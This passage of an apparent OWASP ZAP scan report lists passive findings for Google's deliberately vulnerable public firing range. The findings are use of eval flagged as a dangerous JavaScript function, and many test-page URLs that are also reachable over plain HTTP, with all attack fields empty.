  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/dom/toxicdom/window/name/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/js/encodeURIComponent%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/js/escape%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/js/html_escape%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `eval`
  * Other Info: ``

Instances: 13

### Solution

See the references for security advice on the use of these functions.

### Reference


* [ https://angular.io/guide/security ](https://angular.io/guide/security)


#### CWE Id: [ 749 ](https://cwe.mitre.org/data/definitions/749.html)


#### Source ID: 3

### [ HTTPS Content Available via HTTP ](https://www.zaproxy.org/docs/alerts/10047/)



##### Low (Medium)

### Description

Content which was initially accessed via HTTPS (i.e.: using SSL/TLS encryption) is also accessible via HTTP (without encryption). 

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com`
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/`
* URL: https://public-firing-range.appspot.com/address
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address`
* URL: https://public-firing-range.appspot.com/address/baseURI/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/baseURI/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/baseURI/documentwrite`
* URL: https://public-firing-range.appspot.com/address/documentURI/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/documentURI/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/documentURI/documentwrite`
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/index.html`
* URL: https://public-firing-range.appspot.com/address/location.hash/assign
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/assign`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/assign`
* URL: https://public-firing-range.appspot.com/address/location.hash/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/documentwrite`
* URL: https://public-firing-range.appspot.com/address/location.hash/documentwriteln
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/documentwriteln`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/documentwriteln`
* URL: https://public-firing-range.appspot.com/address/location.hash/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/eval`
* URL: https://public-firing-range.appspot.com/address/location.hash/formaction
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/formaction`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/formaction`
* URL: https://public-firing-range.appspot.com/address/location.hash/function
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/function`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/function`
* URL: https://public-firing-range.appspot.com/address/location.hash/inlineevent
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/inlineevent`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/inlineevent`
* URL: https://public-firing-range.appspot.com/address/location.hash/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/innerHtml`
* URL: https://public-firing-range.appspot.com/address/location.hash/jshref
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/jshref`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/jshref`
* URL: https://public-firing-range.appspot.com/address/location.hash/onclickAddEventListener
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/onclickAddEventListener`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/onclickAddEventListener`
* URL: https://public-firing-range.appspot.com/address/location.hash/onclickSetAttribute
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/onclickSetAttribute`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/onclickSetAttribute`
* URL: https://public-firing-range.appspot.com/address/location.hash/rangeCreateContextualFragment
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/rangeCreateContextualFragment`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/rangeCreateContextualFragment`
* URL: https://public-firing-range.appspot.com/address/location.hash/replace
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/replace`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/replace`
* URL: https://public-firing-range.appspot.com/address/location.hash/setTimeout
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location.hash/setTimeout`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location.hash/setTimeout`
* URL: https://public-firing-range.appspot.com/address/location/assign
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/assign`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/assign`
* URL: https://public-firing-range.appspot.com/address/location/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/documentwrite`
* URL: https://public-firing-range.appspot.com/address/location/documentwriteln
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/documentwriteln`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/documentwriteln`
* URL: https://public-firing-range.appspot.com/address/location/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/eval`
* URL: https://public-firing-range.appspot.com/address/location/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/innerHtml`
* URL: https://public-firing-range.appspot.com/address/location/rangeCreateContextualFragment
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/rangeCreateContextualFragment`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/rangeCreateContextualFragment`
* URL: https://public-firing-range.appspot.com/address/location/replace
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/replace`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/replace`
* URL: https://public-firing-range.appspot.com/address/location/setTimeout
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/location/setTimeout`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/location/setTimeout`
* URL: https://public-firing-range.appspot.com/address/locationhref/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/locationhref/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/locationhref/documentwrite`
* URL: https://public-firing-range.appspot.com/address/locationpathname/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/locationpathname/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/locationpathname/documentwrite`
* URL: https://public-firing-range.appspot.com/address/locationsearch/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/locationsearch/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/locationsearch/documentwrite`
* URL: https://public-firing-range.appspot.com/address/URL/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/URL/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/URL/documentwrite`
* URL: https://public-firing-range.appspot.com/address/URLUnencoded/documentwrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/address/URLUnencoded/documentwrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/address/URLUnencoded/documentwrite`
* URL: https://public-firing-range.appspot.com/angular
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.1.5%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.1.5?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.1.5?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.2.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.2.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.18%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.2.18?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.2.18?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.19%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.2.19?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.2.19?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.2.24%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.2.24?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.2.24?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body/1.6.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body/1.6.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body/1.6.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_alt_symbols/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_alt_symbols/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_alt_symbols/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_alt_symbols_raw/1.6.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_alt_symbols_raw/1.6.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_alt_symbols_raw/1.6.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_attribute_ng/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_attribute_non_ng_raw/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_raw/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_raw/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_escaped/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_raw_escaped/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_raw_escaped/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_escaped_alt_symbols/1.4.0%3Fq=test
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_raw_escaped_alt_symbols/1.4.0?q=test`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_raw_escaped_alt_symbols/1.4.0?q=test`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0`
* URL: https://public-firing-range.appspot.com/angular/angular_cookie_parse/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_cookie_parse/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_cookie_parse/1.6.0`
* URL: https://public-firing-range.appspot.com/angular/angular_form_parse/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_form_parse/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_form_parse/1.6.0`
* URL: https://public-firing-range.appspot.com/angular/angular_post_message_parse/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_post_message_parse/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_post_message_parse/1.6.0`
* URL: https://public-firing-range.appspot.com/angular/angular_storage_parse/1.6.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_storage_parse/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_storage_parse/1.6.0`
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/index.html`
* URL: https://public-firing-range.appspot.com/badscriptimport
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/badscriptimport`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/badscriptimport`
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/badscriptimport/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/badscriptimport/index.html`
* URL: https://public-firing-range.appspot.com/clickjacking
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/clickjacking`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/clickjacking`
* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/clickjacking/clickjacking_csp_no_frame_ancestors`
* URL: https://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall`
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/clickjacking/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/clickjacking/index.html`
* URL: https://public-firing-range.appspot.com/cors
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowInsecureScheme
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowInsecureScheme`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowInsecureScheme`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowNullOrigin
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowNullOrigin`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowNullOrigin`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowOriginEndsWith
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowOriginEndsWith`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowOriginEndsWith`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowOriginProtocolDowngrade
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowOriginProtocolDowngrade`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowOriginProtocolDowngrade`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowOriginRegexDot
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowOriginRegexDot`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowOriginRegexDot`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/allowOriginStartsWith
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/allowOriginStartsWith`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/allowOriginStartsWith`
* URL: https://public-firing-range.appspot.com/cors/alloworigin/dynamicAllowOrigin
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/alloworigin/dynamicAllowOrigin`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/alloworigin/dynamicAllowOrigin`
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/cors/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/cors/index.html`
* URL: https://public-firing-range.appspot.com/dom
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom`
* URL: https://public-firing-range.appspot.com/dom/dompropagation
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/dompropagation`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/dompropagation`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/eval`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/formSubmission/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/eval`
* URL: https://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/eventtriggering/document/inputTyping/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/index.html`
* URL: https://public-firing-range.appspot.com/dom/javascripturi.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/javascripturi.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/javascripturi.html`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/cookie_set/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/referrer
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/referrer`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/referrer`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/referrer/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/referrer/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/document/referrer/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/document/referrer/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/documentWrite`
